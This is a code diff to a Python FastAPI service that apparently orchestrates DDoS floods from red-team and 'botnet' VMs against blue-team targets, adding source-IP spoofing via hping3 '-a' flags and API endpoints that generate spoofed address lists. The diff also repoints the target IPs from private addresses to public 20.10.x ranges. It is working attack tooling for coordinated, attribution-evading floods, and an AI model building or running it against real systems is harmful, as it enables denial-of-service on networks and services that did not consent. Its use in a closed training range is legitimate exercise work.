@@ -10,6 +10,8 @@ import json
 import logging
 import os
 import uuid
+import ipaddress
+import random
 from datetime import datetime
 from typing import Any, Dict, List, Optional
 from dataclasses import dataclass, asdict, field
@@ -48,18 +50,18 @@ API_PORT = int(os.getenv('API_PORT', '8841'))
 
 # Red Team VMs Configuration
 RED_TEAM_VMS = {
-    "scheduler": {"ip": "10.72.200.61", "name": "Attack Scheduler", "role": "Coordination"},
-    "generator": {"ip": "10.72.200.62", "name": "Attack Generator", "role": "Primary Attacker"},
-    "gui": {"ip": "10.72.200.63", "name": "Red Team GUI", "role": "C2 Interface"},
+    "scheduler": {"ip": "10.10.30.30", "name": "Attack Scheduler", "role": "Coordination"},
+        "generator": {"ip": "10.10.30.50", "name": "Attack Generator", "role": "Primary Attacker"},
+        "gui": {"ip": "10.10.30.40", "name": "Red Team GUI", "role": "C2 Interface"},
     "botnet1": {"ip": "10.72.200.64", "name": "Botnet Generator 1", "role": "Distributed Attack"},
     "botnet2": {"ip": "10.72.200.65", "name": "Botnet Generator 2", "role": "Distributed Attack"},
 }
 
 # Blue Team Targets Configuration
 BLUE_TEAM_TARGETS = {
-    "team1": {"ip": "10.72.200.51", "name": "Blue Team 1", "ports": [9080, 9090, 3000]},
-    "team2": {"ip": "10.72.200.54", "name": "Blue Team 2", "ports": [9080, 9090, 3000]},
-    "team3": {"ip": "10.72.200.57", "name": "Blue Team 3", "ports": [9080, 9090, 3000]},
+    "team1": {"ip": "20.10.40.11", "name": "Blue Team 1", "ports": [9080, 9090, 3000]},
+    "team2": {"ip": "20.10.50.13", "name": "Blue Team 2", "ports": [9080, 9090, 3000]},
+    "team3": {"ip": "20.10.60.11", "name": "Blue Team 3", "ports": [9080, 9090, 3000]},
 }
 
 # Attack Tools Configuration
@@ -113,6 +115,8 @@ class AttackExecution:
     end_time: Optional[str] = None
     workers: int = 50
     sockets: int = 100
+    enable_ip_spoofing: bool = False
+    spoofed_ips: Optional[List[str]] = None
     logs: List[str] = field(default_factory=list)
     results: Dict[str, Any] = field(default_factory=dict)
     packets_sent: int = 0
@@ -127,6 +131,20 @@ class AttackRequest(BaseModel):
     duration: int = 120
     workers: int = 50
     sockets: int = 100
+    enable_ip_spoofing: bool = False
+    spoofed_ips: Optional[List[str]] = None
+
+
+class IPSpoofingRequest(BaseModel):
+    ip_range: Optional[str] = None  # CIDR notation, e.g., "192.168.1.0/24"
+    count: int = 10  # Number of IPs to generate
+    starting_ip: Optional[str] = None  # Starting IP for sequential generation
+    use_sequential: bool = False  # If True, generate sequential IPs from starting_ip
+
+
+class IPSpoofingResponse(BaseModel):
+    spoofed_ips: List[str]
+    count: int
 
 
 class AttackResponse(BaseModel):
@@ -209,6 +227,106 @@ class SSHExecutor:
 
 
 # ============================================================================
+# IP Spoofing Utilities
+# ============================================================================
+
+class IPSpoofingUtil:
+    """Utilities for IP spoofing and random IP generation"""
+
+    @staticmethod
+    def generate_random_ips(ip_range: str, count: int = 10) -> List[str]:
+        """
+        Generate random IP addresses from a given CIDR range
+        Args:
+            ip_range: CIDR notation (e.g., "192.168.1.0/24")
+            count: Number of random IPs to generate
+        Returns:
+            List of random IP addresses
+        """
+        try:
+            network = ipaddress.ip_network(ip_range, strict=False)
+            # Get all hosts in the network
+            all_hosts = list(network.hosts())
+
+            if not all_hosts:
+                # For /32 or single IP, use the network address
+                all_hosts = [network.network_address]
+
+            # Generate random IPs
+            num_ips = min(count, len(all_hosts))
+            random_ips = random.sample(all_hosts, num_ips)
+
+            return [str(ip) for ip in random_ips]
+        except ValueError as e:
+            logger.error(f"Invalid IP range: {ip_range} - {e}")
+            raise HTTPException(status_code=400, detail=f"Invalid IP range: {str(e)}")
+
+    @staticmethod
+    def generate_sequential_ips(starting_ip: str, count: int = 10) -> List[str]:
+        """
+        Generate sequential IP addresses from a starting IP
+        Args:
+            starting_ip: Starting IP address (e.g., "192.168.1.10")
+            count: Number of sequential IPs to generate
+        Returns:
+            List of sequential IP addresses
+        """
+        try:
+            start_addr = ipaddress.ip_address(starting_ip)
+            sequential_ips = []
+
+            for i in range(count):
+                try:
+                    next_ip = start_addr + i
+                    sequential_ips.append(str(next_ip))
+                except ipaddress.AddressValueError:
+                    # Stop if we reach the maximum IP address
+                    logger.warning(f"Reached maximum IP address at {next_ip}")
+                    break
+
+            return sequential_ips
+        except ValueError as e:
+            logger.error(f"Invalid starting IP: {starting_ip} - {e}")
+            raise HTTPException(status_code=400, detail=f"Invalid starting IP: {str(e)}")
+
+    @staticmethod
+    def get_common_ip_ranges() -> List[Dict[str, str]]:
+        """Get list of common IP ranges for spoofing"""
+        return [
+            {"name": "Private Class A", "range": "10.0.0.0/8"},
+            {"name": "Private Class B", "range": "172.16.0.0/12"},
+            {"name": "Private Class C", "range": "192.168.0.0/16"},
+            {"name": "Small Subnet (/24)", "range": "192.168.1.0/24"},
+            {"name": "Medium Subnet (/20)", "range": "10.0.0.0/20"},
+            {"name": "Large Subnet (/16)", "range": "172.16.0.0/16"},
+            {"name": "Custom Range", "range": "203.0.113.0/24"},  # TEST-NET-3
+        ]
+
+    @staticmethod
+    def modify_attack_command_for_spoofing(command: str, spoofed_ips: List[str]) -> str:
+        """
+        Modify attack command to use IP spoofing
+        For hping3 commands, use -a flag for source IP spoofing
+        """
+        if not spoofed_ips:
+            return command
+
+        # For hping3-based attacks (SYN, UDP, ICMP floods)
+        if "hping3" in command:
+            # Remove --rand-source if present and add -a flag with random IP
+            command = command.replace("--rand-source", "")
+            random_ip = random.choice(spoofed_ips)
+            # Add -a flag before the target
+            parts = command.split()
+            # Find where to insert -a flag (before target which is usually last)
+            if len(parts) > 1:
+                parts.insert(-1, f"-a {random_ip}")
+            command = " ".join(parts)
+
+        return command
+
+
+# ============================================================================
 # Attack Orchestrator
 # ============================================================================
 
@@ -235,7 +353,9 @@ class AttackOrchestrator:
 
     async def execute_attack(self, attack_id: str, attack_type: str, source_vm_ip: str,
                             target_ip: str, target_port: int, duration: int,
-                            workers: int = 50, sockets: int = 100) -> Dict[str, Any]:
+                            workers: int = 50, sockets: int = 100,
+                            enable_ip_spoofing: bool = False,
+                            spoofed_ips: Optional[List[str]] = None) -> Dict[str, Any]:
         """Execute a single attack from one VM"""
 
         if attack_type not in ATTACK_TOOLS:
@@ -249,6 +369,16 @@ class AttackOrchestrator:
             workers=workers,
             sockets=sockets
         )
+
+        # Apply IP spoofing if enabled
+        if enable_ip_spoofing and spoofed_ips:
+            command = IPSpoofingUtil.modify_attack_command_for_spoofing(command, spoofed_ips)
+            logger.info(f"🎭 IP Spoofing enabled with {len(spoofed_ips)} addresses")
+            await self.broadcast_to_attack(attack_id, {
+                "type": "log",
+                "source": source_vm_ip,
+                "message": f"🎭 IP Spoofing enabled: {len(spoofed_ips)} spoofed addresses"
+            })
 
         # Add logging
         log_file = f"/tmp/ddos_{attack_type}_{attack_id[:8]}.log"
@@ -316,6 +446,8 @@ class AttackOrchestrator:
             start_time=datetime.now().isoformat(),
             workers=request.workers,
             sockets=request.sockets,
+            enable_ip_spoofing=request.enable_ip_spoofing,
+            spoofed_ips=request.spoofed_ips,
         )
 
         self.active_attacks[attack_id] = attack
@@ -332,7 +464,9 @@ class AttackOrchestrator:
                     target_port=request.target_port,
                     duration=request.duration,
                     workers=request.workers,
-                    sockets=request.sockets
+                    sockets=request.sockets,
+                    enable_ip_spoofing=request.enable_ip_spoofing,
+                    spoofed_ips=request.spoofed_ips
                 )
                 tasks.append(task)
 
@@ -481,6 +615,38 @@ async def get_attack_types():
             "requires_sudo": attack_info["requires_sudo"]
         })
     return {"attack_types": types}
+
+
+@app.post("/api/spoofing/generate", response_model=IPSpoofingResponse)
+async def generate_spoofed_ips(request: IPSpoofingRequest):
+    """
+    Generate IP addresses for spoofing - either random from CIDR range or sequential from starting IP
+    """
+    try:
+        if request.use_sequential:
+            # Generate sequential IPs from starting IP
+            if not request.starting_ip:
+                raise HTTPException(status_code=400, detail="starting_ip is required for sequential generation")
+            ips = IPSpoofingUtil.generate_sequential_ips(request.starting_ip, request.count)
+        else:
+            # Generate random IPs from CIDR range
+            if not request.ip_range:
+                raise HTTPException(status_code=400, detail="ip_range is required for random generation")
+            ips = IPSpoofingUtil.generate_random_ips(request.ip_range, request.count)
+
+        return IPSpoofingResponse(spoofed_ips=ips, count=len(ips))
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=400, detail=str(e))
+
+
+@app.get("/api/spoofing/ranges")
+async def get_common_ip_ranges():
+    """
+    Get list of common IP ranges for spoofing
+    """
+    return {"ranges": IPSpoofingUtil.get_common_ip_ranges()}
 
 
 @app.post("/api/attacks/execute", response_model=AttackResponse)
